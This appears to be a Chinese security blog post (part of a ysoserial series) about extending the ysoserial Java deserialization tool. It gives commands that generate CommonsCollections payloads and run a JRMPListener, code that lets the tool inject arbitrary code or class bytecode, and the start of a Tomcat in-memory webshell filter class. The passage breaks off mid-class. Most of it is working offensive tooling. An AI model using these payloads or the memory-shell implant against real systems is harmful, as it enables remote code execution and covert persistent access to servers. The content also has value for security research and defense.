<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ysoserial的使用ysoserial 主要有两种运行方式 一种是利用 java -jar 运行主类函数，利用 gadget 生成反序列化 payload java -jar ysoserial.jar CommonsCollections1 calc  另一种是利用 java -cp 来指定 exploit 包下的特定类来开启交互服务，执行远程攻击 例如：java -cp ysoserial">
<meta property="og:type" content="article">
<meta property="og:title" content="ysoserial系列(2)——简单二开">
<meta property="og:url" content="http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="ysoserial的使用ysoserial 主要有两种运行方式 一种是利用 java -jar 运行主类函数，利用 gadget 生成反序列化 payload java -jar ysoserial.jar CommonsCollections1 calc  另一种是利用 java -cp 来指定 exploit 包下的特定类来开启交互服务，执行远程攻击 例如：java -cp ysoserial">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805165319207.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805165549382.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805175946763.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180341030.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180421893.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180816351.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180949823.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240806023717386.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240806023820214.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240810032747114.png">
<meta property="article:published_time" content="2024-08-05T16:00:00.000Z">
<meta property="article:modified_time" content="2025-08-17T17:30:36.028Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805165319207.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ysoserial系列(2)——简单二开</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/08/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&text=ysoserial系列(2)——简单二开"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&is_video=false&description=ysoserial系列(2)——简单二开"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserial系列(2)——简单二开&body=Check out this article: http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&title=ysoserial系列(2)——简单二开"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&name=ysoserial系列(2)——简单二开&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/&t=ysoserial系列(2)——简单二开"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">ysoserial的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF-ysoserial-%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">使 ysoserial 支持自定义代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialVersionUID%E9%97%AE%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">serialVersionUID问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98-serialVersionUID%E9%97%AE%E9%A2%98"><span class="toc-number">3.1.</span> <span class="toc-text">不同版本依赖问题(serialVersionUID问题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9serialVersionUID"><span class="toc-number">3.2.</span> <span class="toc-text">javassist动态修改serialVersionUID</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ysoserial系列(2)——简单二开
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-05T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-06</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="ysoserial的使用"><a href="#ysoserial的使用" class="headerlink" title="ysoserial的使用"></a>ysoserial的使用</h2><p>ysoserial 主要有两种运行方式</p>
<p>一种是利用 java -jar 运行主类函数，利用 gadget 生成反序列化 payload</p>
<p><code>java -jar ysoserial.jar CommonsCollections1 calc</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805165319207.png" alt="image-20240805165319207"></p>
<p>另一种是利用 java -cp 来指定 exploit 包下的特定类来开启交互服务，执行远程攻击</p>
<p>例如：<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 &#39;calc&#39;</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805165549382.png" alt="image-20240805165549382"></p>
<p>高版本jdk指令如下。因为高版本对反射访问进行了严格的限制。需要明确地开放某些模块才能让 <code>ysoserial</code> 访问需要的类和成员。下面指令适用于java8高版本-java17</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.exe --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="使-ysoserial-支持自定义代码"><a href="#使-ysoserial-支持自定义代码" class="headerlink" title="使 ysoserial 支持自定义代码"></a>使 ysoserial 支持自定义代码</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1575">ysoserial 工具改造（一） – 天下大木头 (wjlshare.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/">使ysoserial支持执行自定义代码 | 回忆飘如雪 (gv7.me)</a></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先看看我们命令行指定的命令这个参数会在哪里被用到，首先ysoserial会从命令行获取两个参数</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805175946763.png" alt="image-20240805175946763"></p>
<p>用cc2来调试一下</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180341030.png" alt="image-20240805180341030"></p>
<p>用<code>Utils.getPayloadClass</code>方法获取<code>CommonsCollections2</code>这个类，实例化之后调用其getObject方法来获取恶意类。并且将我们的命令作为参数传入</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180421893.png" alt="image-20240805180421893"></p>
<p>调用<code>Gadgets.createTemplatesImpl</code>方法创建恶意templates，命令作为参数。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180816351.png" alt="image-20240805180816351"></p>
<p>可以看到我们的命令被拼接进Runtime的exec函数了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805180949823.png" alt="image-20240805180949823"></p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>根据木头师傅的文章添加了四种方式</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>方式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>“code:代码内容”</td>
<td>代码量比较少时采用</td>
</tr>
<tr>
<td>2</td>
<td>“codebase64:代码内容base64编码”</td>
<td>防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td>
</tr>
<tr>
<td>3</td>
<td>“codefile:代码文件路径”</td>
<td>代码量比较多时采用</td>
</tr>
<tr>
<td>4</td>
<td>“classfile:class路径“</td>
<td>利用已生成好的 class 直接获取其字节码</td>
</tr>
</tbody></table>
<p>先将这一行代码注释掉</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">    command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">    <span class="string">&quot;\&quot;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>将上面代码改为如下代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">String cmd;</span><br><span class="line"><span class="keyword">if</span> (command.startsWith(<span class="string">&quot;code:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果命令以 &quot;code:&quot; 开头，直接截取 &quot;code:&quot; 之后的字符串作为代码(cmd)</span></span><br><span class="line">    cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;codebase64:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果命令以 &quot;codebase64:&quot; 开头，截取 &quot;codebase64:&quot; 之后的字符串</span></span><br><span class="line">    <span class="comment">// 解码为字节数组，再转换为字符串，作为代码(cmd)</span></span><br><span class="line">    <span class="type">byte</span>[] decode = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">    cmd = <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;codefile:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果命令以 &quot;codefile:&quot; 开头，截取 &quot;codefile:&quot; 之后的字符串作为文件路径</span></span><br><span class="line">    <span class="comment">// 然后调用 CommonUtils.getCodeFile(codefile) 读取文件内容，将其作为代码(cmd)</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">codefile</span> <span class="operator">=</span> command.substring(<span class="number">9</span>);</span><br><span class="line">    cmd = CommonUtils.getCodeFile(codefile);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (command.startsWith(<span class="string">&quot;classfile:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果命令以 &quot;classfile:&quot; 开头，截取 &quot;classfile:&quot; 之后的字符串作为类文件路径</span></span><br><span class="line">    <span class="comment">// 然后调用 CommonUtils.readClassByte(classfile) 读取类文件的字节码</span></span><br><span class="line">    <span class="comment">// 将字节码注入到 templates 实例的 _bytecodes 字段中，并设置 _name 字段，最后返回 templates 实例</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">classfile</span> <span class="operator">=</span> command.substring(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = CommonUtils.readClassByte(classfile);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果命令不符合上述任何一种前缀，默认将命令作为一个执行命令</span></span><br><span class="line">    <span class="comment">// 使用 Runtime.getRuntime().exec(command) 执行，且对命令中的反斜杠和引号进行转义处理</span></span><br><span class="line">    cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replaceAll(<span class="string">&quot;\\\\&quot;</span>, <span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CommonUtils.java</code>工具类代码如下，cmisl软件包用来管理自己额外添加的类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.cmisl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取指定文件路径的内容，并以字符串形式返回</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 文件内容字符串</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果文件读取失败</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getCodeFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(filePath)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取指定类文件路径的字节码，并以字节数组形式返回</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classFilePath 类文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 类文件的字节数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果文件读取失败</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] readClassByte(String classFilePath) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>假如现在有一个反序列化漏洞，依赖是commons.collections3.2.1，我们要打回显内存马，可以指定参数为<code>CommonsCollections3 classfile:xxx\Tomcat_Echo_Evil_Filter.class</code></p>
<p><code>Tomcat_Echo_Evil_Filter.class</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.DispatcherType;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tomcat_Echo_Evil_Filter</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Tomcat_Echo_Evil_Filter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span 